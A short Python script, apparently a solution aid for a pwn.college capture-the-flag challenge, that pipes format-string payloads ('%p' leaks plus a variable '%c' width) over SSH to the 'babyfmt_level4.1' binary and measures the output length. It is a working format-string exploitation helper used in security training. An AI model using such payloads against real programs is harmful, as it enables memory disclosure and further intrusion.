import subprocess

SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = "AAA " + ("%p " * 80) + "|%{}cMARK"

def measure(width):
    fmt_str = fmt.format(width)
    res = subprocess.run(
        SSH,
        input=fmt_str.encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out = res.stdout.decode("latin-1", errors="ignore")
    target_line = ""
    for line in out.splitlines():
        if line.startswith("AAA "):
            target_line = line
            break
    if target_line:
        idx = target_line.find("MARK")
        length = idx if idx != -1 else len(target_line)
        return target_line[:idx], length
    return "", None

for width in range(0, 256, 16):
    line, length = measure(width)
    print(width, length)
